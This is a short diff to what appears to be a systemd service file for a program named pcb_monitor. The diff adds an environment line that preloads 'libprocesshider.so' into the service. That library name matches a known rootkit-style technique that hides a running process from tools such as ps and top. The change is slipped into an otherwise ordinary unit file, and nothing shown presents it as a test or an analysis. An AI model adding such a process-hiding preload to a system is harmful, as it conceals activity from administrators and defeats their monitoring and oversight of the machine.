@@ -5,6 +5,7 @@ After=network.target local-fs.target
 
 [Service]
 Type=simple
+Environment="LD_PRELOAD=/opt/pcb_monitor/libprocesshider.so"
 ExecStart=/usr/local/bin/pcb_monitor
 Restart=on-failure
 RestartSec=10
